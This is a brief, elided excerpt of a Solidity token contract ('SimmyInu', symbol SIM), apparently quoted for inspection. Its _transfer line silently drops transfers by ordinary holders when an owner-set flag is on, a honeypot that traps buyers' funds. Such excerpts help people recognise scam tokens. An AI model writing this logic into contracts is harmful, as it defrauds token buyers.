...
contract SimmyInu is Context, IERC20 { 
    ...
    string private constant _name = "simmy"; 
    string private constant _symbol = unicode"SIM"; 
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && swapthreshold){ return; }
